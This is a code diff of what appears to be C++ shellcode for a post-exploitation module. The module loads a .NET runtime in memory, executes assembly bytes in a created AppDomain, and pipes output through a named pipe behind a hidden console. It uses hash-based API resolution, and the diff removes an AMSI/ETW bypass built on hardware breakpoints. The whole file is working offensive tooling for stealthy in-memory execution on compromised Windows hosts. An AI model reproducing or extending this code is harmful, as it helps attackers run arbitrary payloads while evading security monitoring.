@@ -16,6 +16,9 @@ auto declfn dotnet_exec(
     WCHAR* appdomain  = dotnet_args->appdomain;
     WCHAR* version    = dotnet_args->fmversion;
 
+    self->ntdll.DbgPrint("args : %ls\n", arguments);
+    self->ntdll.DbgPrint("appdm: %ls\n", appdomain);
+
     struct {
         GUID CLRMetaHost;
         GUID CorRuntimeHost;
@@ -41,21 +44,17 @@ auto declfn dotnet_exec(
     };
 
     BOOL    already_console = TRUE;
-    HANDLE  backup_stdout   = nullptr;
     HANDLE  backup_pipe     = nullptr;
 
     WCHAR** asm_argv  = { nullptr };
     ULONG   asm_argc  = { 0 };
-    BOOL    sucess    = FALSE;
     
     HWND    win_handle  = nullptr;
-    PVOID   output      = nullptr;
-    ULONG   output_len  = 0;
 
     SAFEARRAYBOUND safebound = { 0 };
     SAFEARRAY*     safeasm   = { nullptr };
-    SAFEARRAY*     SafeExpc  = { nullptr };
-    SAFEARRAY*	   safeargs  = { nullptr };
+    SAFEARRAY*     safeexpt  = { nullptr };
+    SAFEARRAY*     safeargs  = { nullptr };
 
     ULONG fmversion_len = MAX_PATH;
     WCHAR fmversion[MAX_PATH] = { 0 };
@@ -80,8 +79,8 @@ auto declfn dotnet_exec(
     SECURITY_ATTRIBUTES secattr = { 0 };
 
     auto dotnet_cleanup = [&]() {
-        if ( ! backup_stdout ) {
-            self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, backup_stdout );
+        if ( backup_pipe ) {
+            self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, backup_pipe );
         }
 
         if ( self->kernel32.GetConsoleWindow() && ! already_console ) { 
@@ -93,50 +92,73 @@ auto declfn dotnet_exec(
         }
 
         if ( safeasm ) {
-            self->ole32.SafeArrayDestroy( safeasm ); safeasm = nullptr;
+            self->oleaut32.SafeArrayDestroy( safeasm ); safeasm = nullptr;
         }
 
         if ( safeargs ) {
-            self->ole32.SafeArrayDestroy( safeargs ); safeargs = nullptr;
+            self->oleaut32.SafeArrayDestroy( safeargs ); safeargs = nullptr;
         }
 
         if ( method_info ) {
-            method_info->Release();
+            method_info->Release(); method_info = nullptr;
+        }
+
+        if ( assembly_obj ) {
+            assembly_obj->Release(); assembly_obj = nullptr;
+        }
+
+        if ( appdomain_obj ) {
+            appdomain_obj->Release(); appdomain_obj = nullptr;
+        }
+
+        if ( runtime_host ) {
+            runtime_host->UnloadDomain( appdomain_thunk );
+            runtime_host->Release(); runtime_host = nullptr;
+        }
+
+        if ( appdomain_thunk ) {
+            appdomain_thunk->Release(); appdomain_thunk = nullptr;
         }
 
         if ( runtime_info ) {
-            runtime_info->Release();
+            runtime_info->Release(); runtime_info = nullptr;
         }
 
-        if ( runtime_host )  {
-            runtime_host->UnloadDomain( appdomain_thunk );
-            runtime_host->Release();
+        if ( enum_unknown ) {
+            enum_unknown->Release(); enum_unknown = nullptr;
+        }
+
+        if ( meta_host ) {
+            meta_host->Release(); meta_host = nullptr;
+        }
+
+        if ( self->pipe.output && self->pipe.output != INVALID_HANDLE_VALUE ) {
+            self->kernel32.DisconnectNamedPipe( self->pipe.output );
+            self->ntdll.NtClose( self->pipe.output );
+            self->pipe.output = INVALID_HANDLE_VALUE;
         }
 
         return result;
     };
 
-    // spawn / explicit / inline
-    {
-        SECURITY_ATTRIBUTES secattr = { 
+    {        
+        secattr = { 
             .nLength = sizeof(SECURITY_ATTRIBUTES), 
             .lpSecurityDescriptor = nullptr,
             .bInheritHandle = TRUE
         };
 
-        self->pipe.output = self->kernel32.CreateNamedPipeW(
+        self->pipe.output = self->kernel32.CreateNamedPipeA(
             self->postex.pipename, PIPE_ACCESS_DUPLEX,
             PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
             1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &secattr
         );
 
         if ( self->pipe.output == INVALID_HANDLE_VALUE ) {
-            DWORD err = NtCurrentTeb()->LastErrorValue;
             return dotnet_cleanup();
         }
 
-        if ( ! self->kernel32.ConnectNamedPipe( self->pipe.output, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED ) {
-            DWORD err = NtCurrentTeb()->LastErrorValue;
+        if ( ! self->kernel32.ConnectNamedPipe( self->pipe.output, nullptr ) ) {
             return dotnet_cleanup();
         }
 
@@ -147,22 +169,25 @@ auto declfn dotnet_exec(
     result = self->mscoree.CLRCreateInstance( 
         xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (PVOID*)&meta_host
     );
-    if ( result || ! meta_host ) {
+    if ( FAILED( result ) || ! meta_host ) {
         return dotnet_cleanup();
     }
 
-    if ( ( self->msvcrt.wcscmp( version, L"v0.0.00000" ) == 0 ) ) {
+    if ( self->msvcrt.wcscmp( version, L"v0.0.00000" ) == 0 ) {
         result = meta_host->EnumerateInstalledRuntimes( &enum_unknown );
         if ( FAILED( result ) ) return dotnet_cleanup();
 
         while ( enum_unknown->Next( 1, &enum_runtime, 0 ) == S_OK ) {
             if ( ! enum_runtime ) continue;
     
-            if ( SUCCEEDED( enum_runtime->QueryInterface( xIID.ICLRRuntimeInfo, (PVOID*)&runtime_info) ) && runtime_info ) {
+            if ( SUCCEEDED( enum_runtime->QueryInterface( xIID.ICLRRuntimeInfo, (PVOID*)&runtime_info ) ) && runtime_info ) {
                 if ( SUCCEEDED( runtime_info->GetVersionString( fmversion, &fmversion_len ) ) ) {
                     version = fmversion;
                 }
             }
+
+            enum_runtime->Release();
+            enum_runtime = nullptr;
         }
     }
 
@@ -172,7 +197,7 @@ auto declfn dotnet_exec(
     }
 
     result = runtime_info->IsLoadable( &is_loadable );
-    if ( result || !is_loadable ) {
+    if ( FAILED( result ) || !is_loadable ) {
         return dotnet_cleanup();
     }
 
@@ -188,15 +213,7 @@ auto declfn dotnet_exec(
         return dotnet_cleanup();
     }
 
-    if ( ! runtime_host ) {
-        return dotnet_cleanup();
-    }
-    
-    if ( ! appdomain ) {
-        return dotnet_cleanup();
-    }
-    
-    result = runtime_host->GetDefaultDomain( &appdomain_thunk );
+    result = runtime_host->CreateDomain( appdomain, nullptr, &appdomain_thunk );
     if ( FAILED( result ) ) {
         return dotnet_cleanup();
     }
@@ -207,13 +224,9 @@ auto declfn dotnet_exec(
     }
 
     safebound = { asm_length, 0 };
-    safeasm   = self->ole32.SafeArrayCreate( VT_UI1, 1, &safebound );
+    safeasm   = self->oleaut32.SafeArrayCreate( VT_UI1, 1, &safebound );
 
     mm::copy( safeasm->pvData, asm_bytes, asm_length );
-
-    if ( self->postex.bypassflag ) {
-        Hwbp::DotnetInit( self->postex.bypassflag );
-    }
 
     result = appdomain_obj->Load_3( safeasm, &assembly_obj );
     if ( FAILED( result ) ) {
@@ -225,38 +238,38 @@ auto declfn dotnet_exec(
         return dotnet_cleanup();
     }
 
-    result = method_info->GetParameters( &SafeExpc );
+    result = method_info->GetParameters( &safeexpt );
     if ( FAILED( result ) ) return dotnet_cleanup();
 
-	if ( SafeExpc ) {
-		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
-			safeargs = self->ole32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
+    if ( safeexpt ) {
+        if ( safeexpt->cDims && safeexpt->rgsabound[0].cElements ) {
+            safeargs = self->oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
 
-			if ( arguments ) {
-                if ( self->msvcrt.wcslen( arguments ) ) {
-                    asm_argv= self->shell32.CommandLineToArgvW( arguments, (PINT)&asm_argc );
-                }
-			}
+            if ( arguments && self->msvcrt.wcslen( arguments ) ) {
+                asm_argv = self->shell32.CommandLineToArgvW( arguments, (PINT)&asm_argc );
+            }
 
-			variant_argv.parray = self->ole32.SafeArrayCreateVector( VT_BSTR, 0, asm_argc );
-			variant_argv.vt     = ( VT_ARRAY | VT_BSTR );
+            variant_argv.parray = self->oleaut32.SafeArrayCreateVector( VT_BSTR, 0, asm_argc );
+            variant_argv.vt     = ( VT_ARRAY | VT_BSTR );
 
-			for ( array_index = 0; array_index < asm_argc; array_index++ ) {
-				self->ole32.SafeArrayPutElement( variant_argv.parray, &array_index, self->ole32.SysAllocString( asm_argv[array_index] ) );
-			}
+            for ( array_index = 0; array_index < (LONG)asm_argc; array_index++ ) {
+                BSTR bstr = self->oleaut32.SysAllocString( asm_argv[array_index] );
+                self->oleaut32.SafeArrayPutElement( variant_argv.parray, &array_index, bstr );
+                self->oleaut32.SysFreeString( bstr );
+            }
 
-			array_index = 0;
-
-			self->ole32.SafeArrayPutElement( safeargs, &array_index, &variant_argv );
-			self->ole32.SafeArrayDestroy( variant_argv.parray );
-		}
-	}
+            array_index = 0;
+            self->oleaut32.SafeArrayPutElement( safeargs, &array_index, &variant_argv );
+            self->oleaut32.SafeArrayDestroy( variant_argv.parray );
+            variant_argv.parray = nullptr;
+        }
+    }
 
     win_handle = self->kernel32.GetConsoleWindow();
 
     if ( ! win_handle ) {
-        ALLOC_CONSOLE_OPTIONS* alloc_console_optional = mm::alloc<ALLOC_CONSOLE_OPTIONS*>( sizeof( ALLOC_CONSOLE_OPTIONS ) );
-        ALLOC_CONSOLE_RESULT*  alloc_console_result   = mm::alloc<ALLOC_CONSOLE_RESULT*>(  sizeof( ALLOC_CONSOLE_RESULT  ) );
+        ALLOC_CONSOLE_OPTIONS* alloc_console_optional = (ALLOC_CONSOLE_OPTIONS*)mm::alloc( sizeof( ALLOC_CONSOLE_OPTIONS ) );
+        ALLOC_CONSOLE_RESULT*  alloc_console_result   = (ALLOC_CONSOLE_RESULT*)mm::alloc(  sizeof( ALLOC_CONSOLE_RESULT  ) );
         
         alloc_console_optional->showWindow    = SW_HIDE;
         alloc_console_optional->mode          = ALLOC_CONSOLE_MODE_NO_WINDOW;
@@ -264,30 +277,16 @@ auto declfn dotnet_exec(
 
         self->kernel32.AllocConsoleWithOptions( alloc_console_optional, alloc_console_result );
 
-        {
-            self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, self->pipe.output );
-            self->kernel32.SetStdHandle( STD_ERROR_HANDLE,  self->pipe.output );
-        }
+        self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, self->pipe.output );
+        self->kernel32.SetStdHandle( STD_ERROR_HANDLE,  self->pipe.output );
+
+        mm::free( alloc_console_optional );
+        mm::free( alloc_console_result );
 
         already_console = FALSE;
     }
 
-    // self->kernel32.SetEvent( self->ctx.sync );
-
-    //
-    // invoke/execute the dotnet assembly
-    //
     result = method_info->Invoke_3( VARIANT(), safeargs, nullptr );
-    if ( FAILED( result ) ) {
-        return dotnet_cleanup();
-    }
-
-    //
-    // desactive hwbp to bypass amsi/etw
-    //
-    if ( self->postex.bypassflag ) {
-        Hwbp::DotnetExit();
-    }
 
     {
         if ( FAILED( result ) ) {
@@ -295,7 +294,6 @@ auto declfn dotnet_exec(
         }
 
         self->kernel32.FlushFileBuffers( self->pipe.output );
-        self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, backup_pipe );
     }
 
     return dotnet_cleanup();
@@ -312,19 +310,29 @@ declfn mself::mself( void ) {
     this->ctx.size  = size;
     this->ctx.heap  = NtCurrentPeb()->ProcessHeap;
 
+    this->ntdll.handle = load_module( hashstr("ntdll.dll") );
+    this->kernel32.handle = load_module( hashstr("kernel32.dll") );
+
     rsl_imp( ntdll );
+    rsl_imp( kernel32 );
 
     this->ntdll.DbgPrint("shellcode: [%d] %p\n", this->ctx.size, this->ctx.start);
     this->ntdll.DbgPrint("end ptr: %p\n", endptr());
 
-    asm("int3");
+    this->mscoree.handle  = (UPTR)this->kernel32.LoadLibraryA("mscoree.dll");
+    this->oleaut32.handle = (UPTR)this->kernel32.LoadLibraryA("oleaut32.dll");
+    this->shell32.handle  = (UPTR)this->kernel32.LoadLibraryA("shell32.dll");
+    this->msvcrt.handle   = (UPTR)this->kernel32.LoadLibraryA("msvcrt.dll");
 
-    rsl_imp( kernel32 );
+    rsl_imp( msvcrt );
     rsl_imp( mscoree );
-    rsl_imp( ole32 );
+    rsl_imp( oleaut32 );
+    rsl_imp( shell32 );
 
     parser::header( argbuff, &this->postex );
-    parser::create( &psr, postex.args, postex.argc );
+    parser::create( &psr, this->postex.args, this->postex.argc );
+
+    this->ntdll.DbgPrint("created\n");
 
     HRESULT result = S_OK;
 
@@ -339,7 +347,7 @@ declfn mself::mself( void ) {
 
     this->ntdll.DbgPrint("dotnet [%d] %p\n", dotnetlen, dotnetbuff);
 
-    this->ntdll.DbgPrint("appdomain %ls\n", arguments);
+    this->ntdll.DbgPrint("appdomain %ls\n", appdomain);
     this->ntdll.DbgPrint("arguments %ls\n", arguments);
     this->ntdll.DbgPrint("fmversion %ls\n", fmversion);
 
@@ -347,6 +355,7 @@ declfn mself::mself( void ) {
 
     dotnet_args.dotnetbuff = dotnetbuff;
     dotnet_args.dotnetlen  = dotnetlen;
+    dotnet_args.arguments  = arguments;
     dotnet_args.appdomain  = appdomain;
     dotnet_args.fmversion  = fmversion;
 
@@ -373,27 +382,13 @@ extern "C" auto declfn entry( PVOID parameter ) -> VOID {
         load_module( hashstr<CHAR>("ntdll.dll")), 
         hashstr<CHAR>("RtlCreateHeap")
     );
-
-    INT32 (*mdbg)( PCHAR, ... ) = (decltype(mdbg))load_api( load_module(hashstr("ntdll.dll")), hashstr("DbgPrint") );
-
-    mdbg("create heap at %p\n", RtlCreateHeap);
-
-    asm("int3");
     
     PVOID CustomHeap = RtlCreateHeap(
         HEAP_GROWABLE | HEAP_ZERO_MEMORY,
         nullptr, 0x100000, 0, nullptr, nullptr
     );
 
-    mdbg("Custom Heap at %p\n", CustomHeap);
-
-    asm("int3");
-
-    mself* self = (mself*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( mself ) ); new(self) mself();
-
-    mdbg("self %p\n", self);
-
-    asm("int3");
+    mself* self = (mself*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( mself ) ); 
 
     if (peb->NumberOfHeaps >= peb->MaximumNumberOfHeaps) {
         ULONG newMax = peb->MaximumNumberOfHeaps * 2;
@@ -412,4 +407,6 @@ extern "C" auto declfn entry( PVOID parameter ) -> VOID {
 
     peb->ProcessHeaps[peb->NumberOfHeaps] = self;
     peb->NumberOfHeaps++;
+
+    new(self) mself();
 }
